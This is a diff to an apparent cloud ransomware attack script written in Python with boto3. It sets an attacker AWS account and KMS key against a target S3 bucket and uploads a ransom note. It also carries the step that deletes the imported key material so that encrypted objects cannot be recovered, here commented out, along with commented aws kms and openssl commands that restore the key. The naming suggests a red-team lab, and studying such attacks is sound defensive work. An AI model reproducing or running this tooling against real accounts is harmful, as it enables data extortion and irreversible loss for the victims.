@@ -7,9 +7,9 @@ import boto3
 #################################
 aws_attacker_cli_profile = 'dev-test'
 aws_attacker_account = '997124715511'
-aws_target_cli_profile = 'default'  # The AWS CLI profile to use for the attack
-bucket_name = 'proservlab-s3-bucket-to-target'  # The S3 bucket to target with the attack
-key_id = '04226edd-51bd-4d33-960e-3c3de9579c81'
+aws_target_cli_profile = 'target'  # The AWS CLI profile to use for the attack
+bucket_name = 'attacksurface-target-s3-bucket-gpt7gm3l'  # The S3 bucket to target with the attack
+key_id = '10d590ca-869e-47fd-a1cf-6e27c4628318'
 kms_key_arn = f'arn:aws:kms:us-east-1:{aws_attacker_account}:key/{key_id}' 
 #################################
 
@@ -32,10 +32,45 @@ result = object.put(Body=txt_data)
 print(f'Uploaded ransom-note.txt')
 
 # switch context back to kms hosting session
-session = boto3.Session(profile_name=aws_attacker_cli_profile)
-client = boto3.client('kms')
-response = client.delete_imported_key_material(
-    KeyId=key_id
-)
+# session = boto3.Session(profile_name=aws_attacker_cli_profile)
+# client = boto3.client('kms')
+# response = client.delete_imported_key_material(
+#     KeyId=key_id
+# )
 
-# need to test if restore key will allow decrypt
+############################
+# restore key material
+############################
+# # generate import params
+# export KEY=`aws kms --profile=dev-test --region us-east-1 get-parameters-for-import --key-id ${KEY_ID} --wrapping-algorithm RSAES_OAEP_SHA_256 --wrapping-key-spec RSA_2048 --query '{Key:PublicKey,Token:ImportToken}' --output text`
+# echo "Key Import Params: ${KEY}"
+
+# # create base64 publickey and token
+# echo $KEY | awk '{print $1}' > PublicKey.b64
+# echo $KEY | awk '{print $2}' > ImportToken.b64
+
+# # create binary publickey and token
+# openssl enc -d -base64 -A -in PublicKey.b64 -out PublicKey.bin
+# openssl enc -d -base64 -A -in ImportToken.b64 -out ImportToken.bin
+
+# # created encrypted key material
+# openssl pkeyutl \
+#     -in PlaintextKeyMaterial.bin \
+#     -out EncryptedKeyMaterial.bin \
+#     -inkey PublicKey.bin \
+#     -keyform DER \
+#     -pubin \
+#     -encrypt \
+#     -pkeyopt \
+#     rsa_padding_mode:oaep \
+#     -pkeyopt rsa_oaep_md:sha256
+
+# # import encrypted key material
+# aws kms --profile=dev-test \
+#     --region us-east-1 \
+#     import-key-material \
+#     --key-id ${KEY_ID} \
+#     --encrypted-key-material \
+#     fileb://EncryptedKeyMaterial.bin \
+#     --import-token fileb://ImportToken.bin \
+#     --expiration-model KEY_MATERIAL_DOES_NOT_EXPIRE
